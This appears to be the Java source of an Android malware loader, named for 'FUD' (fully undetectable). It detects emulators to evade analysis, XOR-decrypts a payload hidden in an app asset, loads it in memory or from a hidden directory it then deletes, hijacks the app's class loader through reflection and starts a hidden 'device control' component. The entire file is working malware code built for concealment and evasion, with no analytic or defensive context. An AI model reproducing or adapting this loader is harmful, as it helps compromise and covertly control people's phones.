package com.fud;

import android.content.Context;
import android.os.Build;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import dalvik.system.DexClassLoader;
import dalvik.system.InMemoryDexClassLoader;
import java.nio.ByteBuffer;

public class FudLoaderYeswti {

    private static final byte[] K = "dzkj1WHMDCpD9NWqarczqzOllT1q4cMs".getBytes();

    public static boolean isSafe() {
        return !(Build.FINGERPRINT.startsWith("generic") || Build.MODEL.contains("Emulator")
                || Build.MANUFACTURER.contains("Genymotion") || "google_sdk".equals(Build.PRODUCT));
    }

    private static volatile boolean sLoaded = false;

    public static synchronized void ensureLoaded(Context ctx) {
        if (sLoaded) return;
        try {
            InputStream is = ctx.getAssets().open("sys_data_gmkyee.dat");
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int r;
            while ((r = is.read(buf)) != -1) baos.write(buf, 0, r);
            is.close();
            byte[] enc = baos.toByteArray();

            byte[] dec = new byte[enc.length];
            for (int i = 0; i < enc.length; i++) dec[i] = (byte) (enc[i] ^ K[i % K.length]);

            ClassLoader appCl = ctx.getClassLoader();
            ClassLoader bootCl = appCl.getParent();

            ClassLoader payloadCl;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ByteBuffer buffer = ByteBuffer.wrap(dec);
                payloadCl = new InMemoryDexClassLoader(buffer, bootCl);
            } else {
                File hid = new File(ctx.getFilesDir(), ".sys_cache");
                if (!hid.exists()) hid.mkdir();
                File dex = new File(hid, "core.dex");
                FileOutputStream fos = new FileOutputStream(dex);
                fos.write(dec); fos.flush(); fos.close();
                File opt = ctx.getDir("dex_opt", Context.MODE_PRIVATE);
                payloadCl = new DexClassLoader(dex.getAbsolutePath(), opt.getAbsolutePath(), null, bootCl);
                dex.delete();
            }

            java.lang.reflect.Field parentField = ClassLoader.class.getDeclaredField("parent");
            parentField.setAccessible(true);
            parentField.set(appCl, payloadCl);

            sLoaded = true;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void executeMbtlfz(Context ctx) {
        if (!isSafe()) return;
        ensureLoaded(ctx);
        try {
            Class<?> pClass = ctx.getClassLoader().loadClass("com.device.ctrl.MainActivity");
            Method m = pClass.getMethod("startHidden", Context.class);
            m.invoke(null, ctx);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
